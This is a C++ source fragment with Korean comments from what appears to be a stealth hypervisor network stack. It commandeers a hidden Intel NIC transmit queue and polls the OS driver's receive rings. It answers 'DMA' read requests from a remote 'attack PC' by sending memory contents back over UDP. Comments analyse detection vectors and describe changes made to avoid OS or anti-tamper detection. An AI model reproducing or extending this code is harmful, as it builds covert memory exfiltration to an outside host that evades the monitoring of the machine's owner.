    // 3. Cache flush
    for (std::uint32_t cl = 0; cl < igc_hv_tx.desc_count * 16; cl += 64)
        _mm_clflush(reinterpret_cast<std::uint8_t*>(ring) + cl);
    _mm_sfence();

    // 4. SW pointers 리셋
    igc_hv_tx.sw_tail = 0;
    igc_hv_tx.sw_head = 0;
    igc_hv_tx.nb_tx_free = igc_hv_tx.desc_count - 1;

    // 5. TDT = 0 + TX queue 재활성화
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDT, 0);
    constexpr std::uint32_t TXDCTL_VAL = IGC_TXDCTL_ENABLE | (1u << 16);
    write_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL, TXDCTL_VAL);
    for (int i = 0; i < 1000; i++) {
        if (read_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL) & IGC_TXDCTL_ENABLE) break;
        _mm_pause();
    }
}

// ============================================================================
// [Fallback] TX Frame Injection - IGC Q0 (Q1 미초기화시 사용)
// ============================================================================
// TX Q1 초기화 실패시 old 방식: OS Q0 descriptor/buffer 빌려서 전송
// ⚠️ OS ring 오염 위험 있음 → Q1 성공하면 이 경로 안 탐
// ============================================================================

static std::uint8_t inject_tx_frame_intel_igc_q0_fallback(
    const std::uint8_t* raw_frame,
    const std::uint32_t frame_len)
{
    network::dbg_txq1_q0_fallback++;
    const cr3 slat = cached_slat_cr3;
    const std::uint32_t tx_count = nic::state.tx_count;
    if (tx_count == 0) return 0;

    const std::uint32_t tdt = nic::read_reg(&slat, nic::reg_tdt(nic::state));
    std::uint32_t tdh = nic::read_reg(&slat, nic::reg_tdh(nic::state));
    const std::uint32_t next_tdt = (tdt + 1) % tx_count;

    if (next_tdt == tdh) {
        constexpr std::uint32_t MAX_DRAIN_POLLS = 1000;
        for (std::uint32_t spin = 0; spin < MAX_DRAIN_POLLS; spin++) {
            tdh = nic::read_reg(&slat, nic::reg_tdh(nic::state));
            if (next_tdt != tdh) break;
        }
        if (next_tdt == tdh) {
            network::packets_dropped++;
            return 0;
        }
    }

    const std::uint64_t desc_gpa = nic::state.tx_ring_gpa + tdt * sizeof(nic::igc_tx_desc_t);
    auto* desc = static_cast<nic::igc_tx_desc_t*>(
        memory_manager::map_guest_physical(slat, desc_gpa));
    if (!desc) return 0;

    if (desc->buffer_addr == 0) { network::packets_dropped++; return 0; }
    if (!(desc->olinfo_status & nic::IGC_TXD_STAT_DD) && desc->cmd_type_len != 0) {
        network::packets_dropped++; return 0;
    }

    auto* buf = static_cast<std::uint8_t*>(
        memory_manager::map_guest_physical(slat, desc->buffer_addr));
    if (!buf) return 0;

    crt::copy_memory(buf, raw_frame, frame_len);

    desc->cmd_type_len = nic::IGC_TXD_DTYP_DATA
        | nic::IGC_TXD_CMD_DEXT
        | nic::IGC_TXD_CMD_EOP
        | nic::IGC_TXD_CMD_IFCS
        | nic::IGC_TXD_CMD_RS
        | (frame_len & 0xFFFF);
    desc->olinfo_status = static_cast<std::uint32_t>(frame_len) << nic::IGC_TXD_PAYLEN_SHIFT;

    _mm_sfence();
    nic::write_reg(&slat, nic::reg_tdt(nic::state), next_tdt);

    constexpr std::uint32_t MAX_TX_WAIT = 10000;
    for (std::uint32_t i = 0; i < MAX_TX_WAIT; i++) {
        if (desc->olinfo_status & nic::IGC_TXD_STAT_DD) break;
    }

    return 1;
}

// ============================================================================
// [핵심] TX Frame Injection - IGC TX Queue 1 (OS Q0 완전 격리!)
// ============================================================================
// OS TX Q0: 0xE000 (드라이버 전용 - 절대 안 건드림)
// HV TX Q1: 0xE040 (우리 전용 hidden page 기반)
//
// 감지 벡터 분석:
//   ✅ OS TDT(0xE018) 변경: 0 → Q1 TDT(0xE058)만 사용
//   ✅ OS 버퍼 덮어쓰기: 0 → 전용 hidden page
//   ✅ OS ring 오염: 0 → 별도 descriptor ring
//   ⚠️ NIC Q1 TDT write: 불가피 (패킷 전송 트리거)
//   ⚠️ 물리 와이어에 패킷 나감: 불가피 (네트워크 통신 본질)
// ============================================================================

// ============================================================================
// [DPDK-style] Batch TX — 3단계: cleanup → enqueue → commit
// ============================================================================
// 기존: inject_tx_frame() 1개씩 + DD wait = 90 × 9μs = 810μs
// 변경: enqueue N개 → commit 1번 = memcpy N회 + MMIO 1회 ≈ 10μs
//
// tx_cleanup(): DD 완료된 descriptor slot 회수 → nb_tx_free 증가
// tx_enqueue(): frame을 ring slot에 복사, descriptor 설정 (TDT 안 건드림)
// tx_commit():  TDT MMIO write 1번 → NIC에 batch 전달
// ============================================================================

// ----------------------------------------------------------------------------
// tx_cleanup: 완료된 descriptor 회수
// ----------------------------------------------------------------------------
// sw_head부터 순회하며 DD=1인 descriptor의 slot을 free로 되돌림
// RS bit이 매 desc에 설정되므로 개별 DD 확인 가능
// ----------------------------------------------------------------------------
static std::uint32_t tx_cleanup()
{
    auto* ring = static_cast<nic::igc_tx_desc_t*>(nic::igc_hv_tx.desc_ring_va);
    const std::uint32_t count = nic::igc_hv_tx.desc_count;
    std::uint32_t head = nic::igc_hv_tx.sw_head;
    std::uint32_t tail = nic::igc_hv_tx.sw_tail;
    std::uint32_t reclaimed = 0;

    // head == tail → ring 비어있음 (회수할 것 없음)
    while (head != tail)
    {
        volatile std::uint32_t* status_ptr =
            reinterpret_cast<volatile std::uint32_t*>(&ring[head].olinfo_status);
        if (!(*status_ptr & nic::IGC_TXD_STAT_DD))
            break;  // 아직 NIC 미완료 → 여기서 멈춤

        reclaimed++;
        head = (head + 1) % count;
    }

    if (reclaimed > 0)
    {
        nic::igc_hv_tx.sw_head = head;
        nic::igc_hv_tx.nb_tx_free += reclaimed;
        nic::igc_hv_tx.dbg_cleanup_reclaimed += reclaimed;
    }
    return reclaimed;
}

// ----------------------------------------------------------------------------
// tx_enqueue: frame 1개를 ring slot에 적재 (TDT 변경 없음!)
// ----------------------------------------------------------------------------
// 리턴: 1=성공, 0=ring full
// NIC는 아직 이 frame을 모름 (TDT 안 움직임)
// ----------------------------------------------------------------------------
static std::uint8_t tx_enqueue(
    const std::uint8_t* raw_frame,
    const std::uint32_t frame_len)
{
    if (nic::igc_hv_tx.nb_tx_free == 0) {
        // ring full → cleanup 시도
        tx_cleanup();
        if (nic::igc_hv_tx.nb_tx_free == 0) {
            nic::igc_hv_tx.dbg_ring_full_count++;
            return 0;  // 진짜 full
        }
    }

    const std::uint32_t slot = nic::igc_hv_tx.sw_tail;
    const std::uint32_t count = nic::igc_hv_tx.desc_count;

    // Frame → slot buffer 복사
    auto* buf = static_cast<std::uint8_t*>(nic::igc_hv_tx.buf_va[slot]);
    crt::copy_memory(buf, raw_frame, frame_len);

    // Cache flush: buffer data
    for (std::uint32_t cl = 0; cl < frame_len; cl += 64)
        _mm_clflush(buf + cl);

    // Descriptor 설정
    auto* ring = static_cast<nic::igc_tx_desc_t*>(nic::igc_hv_tx.desc_ring_va);
    auto& desc = ring[slot];
    desc.buffer_addr = nic::igc_hv_tx.buf_gpa[slot];
    desc.olinfo_status = static_cast<std::uint32_t>(frame_len) << nic::IGC_TXD_PAYLEN_SHIFT;
    desc.cmd_type_len = nic::IGC_TXD_DTYP_DATA
        | nic::IGC_TXD_CMD_DEXT
        | nic::IGC_TXD_CMD_EOP
        | nic::IGC_TXD_CMD_IFCS
        | nic::IGC_TXD_CMD_RS       // 매 desc RS → 개별 DD writeback
        | (frame_len & 0xFFFF);

    // Cache flush: descriptor
    _mm_clflush(&desc);

    // SW tail 전진
    nic::igc_hv_tx.sw_tail = (slot + 1) % count;
    nic::igc_hv_tx.nb_tx_free--;
    nic::igc_hv_tx.dbg_enqueue_count++;

    return 1;
}

// ----------------------------------------------------------------------------
// tx_commit: TDT MMIO write → NIC에 batch 전달
// ----------------------------------------------------------------------------
// enqueue한 모든 frame을 한 번에 NIC에 알림
// 이 함수가 호출되기 전까지 NIC는 새 frame을 모름
// ----------------------------------------------------------------------------
static void tx_commit()
{
    _mm_sfence();  // 모든 store 완료 보장
    const cr3 slat = cached_slat_cr3;
    nic::write_reg(&slat, nic::IGC_TXQ1_TDT, nic::igc_hv_tx.sw_tail);
    nic::igc_hv_tx.dbg_commit_count++;
}

// ============================================================================
// [호환성] inject_tx_frame_intel_igc — batch TX wrapper
// ============================================================================
// 기존 코드 호환: 단일 frame inject → enqueue + commit
// flush_deferred_tx에서는 직접 enqueue/commit 사용
// ============================================================================
static std::uint8_t inject_tx_frame_intel_igc(
    const std::uint8_t* raw_frame,
    const std::uint32_t frame_len)
{
    network::dbg_inject_total++;
    network::dbg_inject_last_len = frame_len;

    if (!nic::igc_hv_tx.initialized) {
        return inject_tx_frame_intel_igc_q0_fallback(raw_frame, frame_len);
    }

    if (!tx_enqueue(raw_frame, frame_len)) {
        network::packets_dropped++;
        nic::igc_hv_tx.consecutive_fail++;
        if (nic::igc_hv_tx.consecutive_fail > network::dbg_txq1_consec_max)
            network::dbg_txq1_consec_max = nic::igc_hv_tx.consecutive_fail;

        if (nic::igc_hv_tx.consecutive_fail >= 10) {
            const cr3 slat = cached_slat_cr3;
            nic::reset_tx_ring(&slat);
            network::dbg_txq1_re_enable++;
            nic::igc_hv_tx.consecutive_fail = 0;
        }
        return 0;
    }

    tx_commit();
    network::dbg_inject_success++;
    nic::igc_hv_tx.consecutive_fail = 0;
    return 1;
}

// ============================================================================
// TX Frame Injection - Dispatcher
// ============================================================================

static std::uint8_t inject_tx_frame(
    const std::uint8_t* raw_frame,
    const std::uint32_t frame_len)
{
    if (nic::state.nic_type == nic::nic_type_t::INTEL)
    {
        // [핵심] igc(I225/I226): 전용 TX Queue 1 사용 (OS Q0 격리!)
        if (nic::state.intel_gen == nic::intel_gen_t::IGC)
            return inject_tx_frame_intel_igc(raw_frame, frame_len);
        else
            return inject_tx_frame_intel_legacy(raw_frame, frame_len);
    }
    return 0;
}

// ============================================================================
// [DPDK-style] Deferred TX Flush — batch enqueue + single commit
// ============================================================================
// 기존: chunk마다 inject_tx_frame() → 90 DD waits + 90 MMIO = ~810μs
// 변경: chunk마다 tx_enqueue() → 1 tx_commit() = memcpy 90회 + MMIO 1회
//
// Ring full 대응:
//   127 slots (ring-1) < 필요 chunks → 중간에 commit+cleanup 반복
//   일반 ReadScatter(4KB) = ~3 chunks → 여유
//   대량 읽기(128KB) = ~90 chunks → ring 127로 1회 커버
// ============================================================================
static std::uint32_t flush_deferred_tx()
{
    if (!deferred_tx.active) return 0;

    // [핵심] stale timeout: 클라이언트 사망 대비
    const std::uint64_t elapsed = read_tsc() - deferred_tx.start_tsc;
    if (elapsed > DEFERRED_TX_TIMEOUT_TSC) {
        deferred_tx.active = 0;
        return 0;
    }

    constexpr std::uint32_t CHUNK_HDR_SIZE = 12;
    constexpr std::uint32_t CHUNK_DATA_MAX = 1460;
    constexpr std::uint32_t ETH_HDR_SIZE = 14;
    constexpr std::uint32_t IP_HDR_SIZE = 20;

    const std::uint8_t* payload = response_buffer;
    const std::uint32_t payload_size = deferred_tx.payload_size;
    const std::uint32_t total_chunks = deferred_tx.total_chunks;
    const std::uint32_t cur_seq = deferred_tx.response_seq;

    std::uint32_t chunks_this_exit = 0;
    std::uint32_t ci = deferred_tx.next_chunk;
    std::uint32_t enqueued_since_commit = 0;

    // [batch TX] 진입 시 cleanup: 이전 batch에서 완료된 slot 회수
    if (nic::igc_hv_tx.initialized) {
        tx_cleanup();
    }

    while (ci < total_chunks && chunks_this_exit < MAX_CHUNKS_PER_EXIT)
    {
        // [batch TX] ring full → 중간 commit + cleanup
        if (nic::igc_hv_tx.initialized && nic::igc_hv_tx.nb_tx_free == 0) {
            if (enqueued_since_commit > 0) {
                tx_commit();
                enqueued_since_commit = 0;
            }
            // DD 완료 대기: 최대 25000 pause (~500μs)
            for (std::uint32_t w = 0; w < 25000; w++) {
                tx_cleanup();
                if (nic::igc_hv_tx.nb_tx_free > 0) break;
                _mm_pause();
            }
            if (nic::igc_hv_tx.nb_tx_free == 0) {
                // 진짜 stuck → recovery
                nic::igc_hv_tx.consecutive_fail++;
                if (nic::igc_hv_tx.consecutive_fail >= 10) {
                    const cr3 slat = cached_slat_cr3;
                    nic::reset_tx_ring(&slat);
                    network::dbg_txq1_re_enable++;
                    nic::igc_hv_tx.consecutive_fail = 0;
                }
                break;  // 이번 exit에서 중단
            }
        }

        // 이 chunk의 데이터 오프셋/크기
        std::uint32_t data_offset = ci * CHUNK_DATA_MAX;
        std::uint32_t remaining = (data_offset < payload_size) ? (payload_size - data_offset) : 0;
        std::uint32_t chunk_data = (remaining > CHUNK_DATA_MAX) ? CHUNK_DATA_MAX : remaining;
        std::uint32_t udp_payload_size = CHUNK_HDR_SIZE + chunk_data;

        // 프레임 구성: ETH(14) + IP(20) + UDP(8) + chunk_hdr(12) + data
        auto* eth = reinterpret_cast<packet::eth_hdr_t*>(tx_frame_buffer);
        auto* ip = reinterpret_cast<packet::ip_hdr_t*>(tx_frame_buffer + ETH_HDR_SIZE);
        auto* udp = reinterpret_cast<packet::udp_hdr_t*>(tx_frame_buffer + ETH_HDR_SIZE + IP_HDR_SIZE);

        // chunk header
        auto* chdr16 = reinterpret_cast<std::uint16_t*>(
            tx_frame_buffer + ETH_HDR_SIZE + IP_HDR_SIZE + 8);
        chdr16[0] = static_cast<std::uint16_t>(ci);
        chdr16[1] = static_cast<std::uint16_t>(total_chunks);
        auto* chdr32 = reinterpret_cast<std::uint32_t*>(chdr16 + 2);
        chdr32[0] = payload_size;
        chdr32[1] = cur_seq;

        if (chunk_data > 0) {
            crt::copy_memory(
                tx_frame_buffer + ETH_HDR_SIZE + IP_HDR_SIZE + 8 + CHUNK_HDR_SIZE,
                payload + data_offset, chunk_data);
        }

        // ETH header
        for (int i = 0; i < 6; i++) {
            eth->dst_mac[i] = nic::state.attack_mac[i];
            eth->src_mac[i] = nic::state.mac[i];
        }
        eth->ethertype = packet::ETHERTYPE_IPV4;

        // IP header
        ip->ver_ihl = 0x45;
        ip->tos = 0;
        ip->total_length = packet::htons(
            static_cast<std::uint16_t>(IP_HDR_SIZE + 8 + udp_payload_size));
        ip->identification = packet::htons(ip_frag::next_ip_id());
        ip->flags_frag = packet::htons(ip_frag::IP_FLAG_DF);
        ip->ttl = 128;
        ip->protocol = packet::IP_PROTO_UDP;
        ip->checksum = 0;
        ip->src_ip = our_ip;
        ip->dst_ip = nic::state.attack_ip;
        ip->checksum = packet::ip_checksum(ip, IP_HDR_SIZE);

        // UDP header
        udp->src_port = our_src_port;
        udp->dst_port = attack_src_port;
        udp->length = packet::htons(static_cast<std::uint16_t>(8 + udp_payload_size));
        udp->checksum = 0;

        // TX snap (디버그)
        {
            for (int si = 0; si < 16; si++)
                network::dbg_tx_snap[si] = reinterpret_cast<const std::uint32_t*>(tx_frame_buffer)[si];
            const volatile std::uint16_t v_our = our_src_port;
            const volatile std::uint16_t v_atk = attack_src_port;
            network::dbg_tx_snap_ports = (static_cast<std::uint32_t>(v_our) << 16)
                | static_cast<std::uint32_t>(v_atk);
        }

        std::uint32_t frame_size = ETH_HDR_SIZE + IP_HDR_SIZE + 8 + udp_payload_size;

        // [DPDK-style] enqueue만 (commit은 루프 밖에서 1번)
        if (nic::igc_hv_tx.initialized) {
            std::uint8_t ok = tx_enqueue(
                tx_frame_buffer, frame_size);
            if (ok) {
                deferred_tx.chunks_sent_ok++;
                enqueued_since_commit++;
            }
        }
        else {
            // fallback: legacy inject (Q0)
            std::uint8_t ok = inject_tx_frame(tx_frame_buffer, frame_size);
            if (ok) deferred_tx.chunks_sent_ok++;
        }

        ci++;
        chunks_this_exit++;
    }

    // [DPDK-style] 루프 완료 후 단 1번 commit → NIC에 batch 전달
    if (enqueued_since_commit > 0) {
        tx_commit();
        nic::igc_hv_tx.consecutive_fail = 0;
    }

    deferred_tx.next_chunk = ci;

    // 전송 완료?
    if (ci >= total_chunks) {
        deferred_tx.active = 0;
    }

    return chunks_this_exit;
}

// ============================================================================
// Send Response - Deferred TX 시작 (즉시 전송 아님!)
// ============================================================================
// [핵심] 이전: chunked_udp_send()로 722 chunks 한번에 전송 → HV 사망
// 변경: deferred_tx state 설정만 하고 return → process_pending()에서 분할 전송
// ============================================================================

std::uint8_t network::send_response(
    const std::uint8_t* dma_response,
    const std::uint32_t size)
{
    network::dbg_send_response_enter++;

    std::uint32_t fail_bits = 0;
    if (!is_initialized) fail_bits |= 1;
    if (!nic::state.attack_mac_learned) fail_bits |= 2;
    if (!tx_frame_buffer) fail_bits |= 4;

    if (fail_bits) {
        network::dbg_send_response_fail = fail_bits;
        return 0;
    }

    while (deferred_tx.active) {
        flush_deferred_tx();
    }

    constexpr std::uint32_t CHUNK_DATA_MAX = 1460;
    std::uint32_t chunk_total = (size + CHUNK_DATA_MAX - 1) / CHUNK_DATA_MAX;
    if (chunk_total == 0) chunk_total = 1;

    deferred_tx.payload_size = size;
    deferred_tx.total_chunks = chunk_total;
    deferred_tx.next_chunk = 0;
    deferred_tx.response_seq = deferred_tx_seq_counter++;
    deferred_tx.chunks_sent_ok = 0;
    deferred_tx.start_tsc = read_tsc();
    deferred_tx.active = 1;

    flush_deferred_tx();

    network::dbg_frag_last_count = chunk_total;
    packets_sent++;
    return 1;
}

std::uint8_t network::send_packet(const std::uint8_t* data, const std::uint32_t size)
{
    return send_response(data, size);
}

// ============================================================================
// Learn Attack PC Address
// ============================================================================

static void learn_attack_address(const std::uint8_t* pkt_data)
{
    const auto* eth = reinterpret_cast<const packet::eth_hdr_t*>(pkt_data);
    const auto* ip = reinterpret_cast<const packet::ip_hdr_t*>(pkt_data + 14);
    const auto* udp = reinterpret_cast<const packet::udp_hdr_t*>(pkt_data + 34);

    for (int i = 0; i < 6; i++)
        nic::state.attack_mac[i] = eth->src_mac[i];

    nic::state.attack_ip = ip->src_ip;
    our_ip = ip->dst_ip;
    our_src_port = udp->dst_port;           // HV측 포트 (28473, network order)
    attack_src_port = udp->src_port;        // [핵심] 공격 PC의 ephemeral port (network order)
    nic::state.attack_mac_learned = 1;
}

// ============================================================================
// DMA Payload Processing
// ============================================================================

static void process_complete_dma_payload(
    const std::uint8_t* dma_payload,
    std::uint32_t dma_size)
{
    network::dbg_rx_dma_call++;
    network::dbg_dma_payload_size = dma_size;
    if (dma_size < 16) { network::dbg_dma_fail_reason = 1; return; }

    const auto magic = *reinterpret_cast<const std::uint32_t*>(dma_payload);
    if (magic != 0x48564430) { network::dbg_dma_fail_reason = 2; return; }

    const auto* hdr = reinterpret_cast<const dma::msg_hdr_t*>(dma_payload);
    network::dbg_dma_last_version = hdr->version;
    network::dbg_dma_last_type = static_cast<std::uint32_t>(hdr->type);
    network::dbg_dma_last_cbmsg = hdr->cb_msg;

    if (hdr->type == dma::msg_type_t::open_req) {
        deferred_tx.active = 0;
    }

    if (hdr->version != 0x0001) { network::dbg_dma_fail_reason = 3; }
    else if (hdr->cb_msg > dma_size) { network::dbg_dma_fail_reason = 4; }

    const std::uint32_t rsp_size = dma::process(
        dma_payload, dma_size,
        response_buffer, response_buffer_size);

    network::dbg_dma_rsp_size = rsp_size;
    if (rsp_size > 0) {
        network::dbg_dma_rsp_nonzero++;
        network::dbg_dma_fail_reason = 0;
        network::send_response(response_buffer, rsp_size);
    }
    else if (network::dbg_dma_fail_reason < 3) {
        network::dbg_dma_fail_reason = 5;
    }
    network::packets_received++;
}

// ============================================================================
// RX Packet Processing
// ============================================================================

static std::uint8_t process_rx_packet(
    const std::uint8_t* pkt_data,
    const std::uint32_t pkt_len)
{
    network::dbg_rx_call_count++;
    network::dbg_last_pkt_len = static_cast<std::uint16_t>(pkt_len);

    // [DIAG] 수신 패킷 첫 64바이트 hex dump (dbg_hex[] 재활용)
    // 이전에는 TX first fragment 용이었는데, RX 디버그가 더 급함
    {
        const std::uint32_t dump_len = (pkt_len < 64) ? pkt_len : 64;
        for (std::uint32_t i = 0; i < dump_len / 4; i++)
            network::dbg_hex[i] = *reinterpret_cast<const std::uint32_t*>(pkt_data + i * 4);
        // 나머지 0으로
        for (std::uint32_t i = dump_len / 4; i < 16; i++)
            network::dbg_hex[i] = 0;
    }

    if (pkt_len < 34 || pkt_len > 1514) return 0;

    const auto* eth = reinterpret_cast<const packet::eth_hdr_t*>(pkt_data);
    if (eth->ethertype != packet::ETHERTYPE_IPV4) return 0;

    const std::uint8_t* ip_packet = pkt_data + 14;
    const std::uint32_t ip_len = pkt_len - 14;
    const auto* ip_hdr = reinterpret_cast<const packet::ip_hdr_t*>(ip_packet);

    if (ip_hdr->protocol != packet::IP_PROTO_UDP) return 0;

    const std::uint8_t* udp_payload = nullptr;
    std::uint32_t udp_payload_size = 0;

    const std::uint8_t result = ip_frag::process_ip_packet(
        ip_packet, ip_len,
        &udp_payload, &udp_payload_size);

    if (result == 2)
    {
        network::dbg_rx_udp_count++;

        // [버그수정 0xFB] learn을 여기서 제거 → DMA 포트 체크 안으로 이동
        // 이전: 첫 UDP(NetBIOS 137 등)에서 learn → our_src_port 오염

        const auto* udp_hdr = reinterpret_cast<const packet::udp_hdr_t*>(
            ip_packet + (ip_hdr->ver_ihl & 0x0F) * 4);

        network::dbg_last_dst_port = packet::ntohs(udp_hdr->dst_port);

        // [핵심] payload 첫 4바이트 기록 (magic 진단용)
        if (udp_payload_size >= 4)
            network::dbg_last_payload_magic = *reinterpret_cast<const std::uint32_t*>(udp_payload);

        if (packet::ntohs(udp_hdr->dst_port) == packet::DMA_PORT)
        {
            network::dbg_rx_port_match++;

            // [핵심 버그 수정] learn을 DMA 포트 체크 안에서 실행!
            // 이전: 포트 체크 전에 learn → 첫 UDP가 NetBIOS(137)이면 our_src_port=137 고정!
            // 수정: DMA 패킷에서만 learn + 매 DMA 패킷마다 port 갱신
            if (!nic::state.attack_mac_learned)
                learn_attack_address(pkt_data);

            // [핵심] 매 DMA 패킷마다 양쪽 포트 갱신 (재접속시 ephemeral port 변경됨)
            attack_src_port = udp_hdr->src_port;
            our_src_port = udp_hdr->dst_port;  // [버그수정] 이전엔 learn에서만 1회 세팅
            network::dbg_attack_src_port = packet::ntohs(udp_hdr->src_port);

            // [핵심] volatile scalar 진단 (컴파일러 최적화 방지)
            // ETH+IP 헤더에서 직접 읽기 (volatile cast로 강제 읽기)
            network::dbg_pkt_eth0 = *reinterpret_cast<const volatile std::uint32_t*>(pkt_data);
            network::dbg_pkt_ip0 = *reinterpret_cast<const volatile std::uint32_t*>(pkt_data + 14);
            network::dbg_pkt_ip4 = *reinterpret_cast<const volatile std::uint32_t*>(pkt_data + 18);

            // UDP ports 직접 읽기
            const std::uint32_t ihl_val = (pkt_data[14] & 0x0F) * 4;
            network::dbg_pkt_udp0 = *reinterpret_cast<const volatile std::uint32_t*>(pkt_data + 14 + ihl_val);

            // IP 파싱 중간값
            network::dbg_ip_total = packet::ntohs(*reinterpret_cast<const std::uint16_t*>(pkt_data + 16));
            network::dbg_ip_ihl = ihl_val;
            network::dbg_udp_payload_ptr_off = static_cast<std::uint32_t>(udp_payload - pkt_data);
            network::dbg_pkt_len = pkt_len;

            // [핵심] UDP length + checksum (패딩 vs 실제 크기 판별)
            const std::uint8_t* udp_hdr_ptr = pkt_data + 14 + ihl_val;
            network::dbg_udp_len = packet::ntohs(*reinterpret_cast<const std::uint16_t*>(udp_hdr_ptr + 4));
            network::dbg_udp_chksum = packet::ntohs(*reinterpret_cast<const std::uint16_t*>(udp_hdr_ptr + 6));

            // DMA payload 직접 읽기 (udp_payload 포인터 사용)
            if (udp_payload_size >= 16) {
                network::dbg_pkt_dma0 = *reinterpret_cast<const volatile std::uint32_t*>(udp_payload);
                network::dbg_pkt_dma4 = *reinterpret_cast<const volatile std::uint32_t*>(udp_payload + 4);
                network::dbg_pkt_dma8 = *reinterpret_cast<const volatile std::uint32_t*>(udp_payload + 8);
                network::dbg_pkt_dma12 = *reinterpret_cast<const volatile std::uint32_t*>(udp_payload + 12);

                // [핵심] 개별 바이트 캡처 - dword read vs byte read 비교
                network::dbg_payload_b0 = static_cast<std::uint32_t>(
                    *reinterpret_cast<const volatile std::uint8_t*>(udp_payload));
                network::dbg_payload_b4 = static_cast<std::uint32_t>(
                    *reinterpret_cast<const volatile std::uint8_t*>(udp_payload + 4));
                network::dbg_payload_b5 = static_cast<std::uint32_t>(
                    *reinterpret_cast<const volatile std::uint8_t*>(udp_payload + 5));
                network::dbg_payload_b8 = static_cast<std::uint32_t>(
                    *reinterpret_cast<const volatile std::uint8_t*>(udp_payload + 8));
                network::dbg_payload_b10 = static_cast<std::uint32_t>(
                    *reinterpret_cast<const volatile std::uint8_t*>(udp_payload + 10));
            }

            process_complete_dma_payload(udp_payload, udp_payload_size);
            return 1;
        }
    }
    else if (result == 1)
    {
        network::dbg_rx_udp_count++;

        // [버그수정 0xFB] learn은 DMA 포트 매치 후에만 (위 path에서 처리)
        // reassembled fragment는 이미 learn 완료된 상태여야 함

        // [핵심] reassembled payload 첫 4바이트 기록
        if (udp_payload_size >= 4)
            network::dbg_last_payload_magic = *reinterpret_cast<const std::uint32_t*>(udp_payload);

        network::dbg_rx_port_match++;
        process_complete_dma_payload(udp_payload, udp_payload_size);
        return 1;
    }

    return 0;
}

// ============================================================================
// RX Ring Polling - Intel e1000e (Legacy Descriptor)
// ============================================================================

static std::uint8_t poll_rx_ring_intel_legacy()
{
    const cr3 slat = cached_slat_cr3;
    std::uint8_t processed = 0;

    // [핵심] TX stats 클리어 제거 - 레지스터 변조 감지 벡터 제거

    // [핵심] 올바른 RDH 오프셋 사용
    const std::uint32_t rx_head = nic::read_reg(&slat, nic::reg_rdh(nic::state));
    const std::uint32_t rx_count = nic::state.rx_count;
    if (rx_count == 0) return 0;

    std::uint32_t idx = nic::state.our_rx_index;
    std::uint32_t checked = 0;
    constexpr std::uint32_t MAX_PACKETS_PER_POLL = 32;

    while (idx != rx_head && checked < MAX_PACKETS_PER_POLL)
    {
        const std::uint64_t desc_gpa = nic::state.rx_ring_gpa + idx * sizeof(nic::intel_rx_desc_t);
        const auto* desc = static_cast<const nic::intel_rx_desc_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!desc) break;

        if (!(desc->status & nic::INTEL_RX_STATUS_DD)) break;

        if (desc->status & nic::INTEL_RX_STATUS_EOP)
        {
            const auto* pkt_data = static_cast<const std::uint8_t*>(
                memory_manager::map_guest_physical(slat, desc->buffer_addr));

            if (pkt_data)
            {
                // [핵심] Guest 메모리 로컬 복사 (race condition 방지)
                static std::uint8_t rx_local_buf_leg[1514];
                const std::uint16_t len = desc->length;
                if (len > 0 && len <= 1514) {
                    crt::copy_memory(rx_local_buf_leg, pkt_data, len);
                    processed |= process_rx_packet(rx_local_buf_leg, len);
                }
            }
        }

        idx = (idx + 1) % rx_count;
        checked++;
    }

    nic::state.our_rx_index = idx;
    ip_frag::reasm_tick();
    return processed;
}

// ============================================================================
// [핵심] RX Ring Polling - Intel igc 멀티큐 (Advanced Descriptor)
// ============================================================================
// I225-V RSS가 4개 큐에 패킷 분배 → 전부 폴링해야 누락 없음
// MRQC/RETA 수정 없이 순수 읽기 전용!
//
// 큐별 advanced write-back format:
//   staterr[0] = DD, staterr[1] = EOP
//   length = packet length (separate field)
//   buffer_addr → RSS hash (원본 주소 사라짐, 큐별 캐시에서 읽어야 함)
// ============================================================================

static std::uint8_t poll_rx_ring_intel_igc()
{
    const cr3 slat = cached_slat_cr3;
    std::uint8_t processed = 0;

    // [핵심] 모든 활성 큐 순회 - NIC 레지스터 쓰기 0!
    for (std::uint32_t q = 0; q < nic::IGC_MAX_RX_QUEUES; q++)
    {
        auto& rxq = nic::igc_rxq[q];
        if (!rxq.active || rxq.count == 0) continue;

        // ================================================================
        // [핵심 0xFB] ROTATING RING SCANNER - 전체 ring 순회하여 DD=0 캐싱
        // ================================================================
        // 문제: our_index 앞 64개만 스캔하면 DD=1 영역만 보임
        // 해결: scan_cursor가 매 VMEXIT마다 32개씩 전진, ~32회면 1024 전체 완료
        //
        // Ring layout:
        //   [our_index] ──DD=1──> [RDH] ──DD=0──> [RDT] ──DD=1──> [our_index]
        //                                    ↑ DD=0 = READ format = pkt_addr 유효!
        //
        // DD=0 descriptor의 pkt_addr → 캐시에 저장
        // DD=1이 되면(NIC 처리 후) pkt_addr는 rss_hash로 덮어씌워지지만
        // 캐시에 이미 올바른 주소가 있으므로 정확한 버퍼 접근 가능
        // ================================================================
        if (rxq.buf_cache_valid)
        {
            constexpr std::uint32_t SCAN_PER_VMEXIT = 32;
            std::uint32_t scan_idx = rxq.scan_cursor;

            for (std::uint32_t s = 0; s < SCAN_PER_VMEXIT; s++)
            {
                if (scan_idx >= rxq.count) scan_idx = 0;

                network::dbg_scan_total++;

                if (scan_idx < nic::MAX_RXQ_BUF_CACHE)
                {
                    const std::uint64_t desc_gpa = rxq.ring_gpa + scan_idx * 16;

                    // [핵심] 16바이트 전체를 하나의 READ format으로 해석
                    // READ format: [0:7]=pkt_addr, [8:15]=hdr_addr
                    // WB format:   [0:3]=rss, [4:7]=info, [8:11]=staterr(DD@bit0), [12:15]=len+vlan
                    // DD 판별: offset[8:11] bit 0 → WB에서는 DD, READ에서는 hdr_addr LSB
                    // igc driver는 hdr_addr=0으로 설정 → bit 0 = 0 → DD=0 정확
                    const auto* raw = static_cast<const volatile std::uint8_t*>(
                        memory_manager::map_guest_physical(slat, desc_gpa));

                    if (raw)
                    {
                        // staterr는 offset [8:11], DD = bit 0
                        const std::uint32_t staterr = *reinterpret_cast<const volatile std::uint32_t*>(raw + 8);

                        if (!(staterr & nic::IGC_RXD_STAT_DD))
                        {
                            // DD=0 → READ format → pkt_addr at [0:7]
                            network::dbg_scan_dd0++;

                            const std::uint64_t addr = *reinterpret_cast<const volatile std::uint64_t*>(raw);
                            const std::uint64_t hdr = *reinterpret_cast<const volatile std::uint64_t*>(raw + 8);

                            // 첫 DD=0 진단 캡처
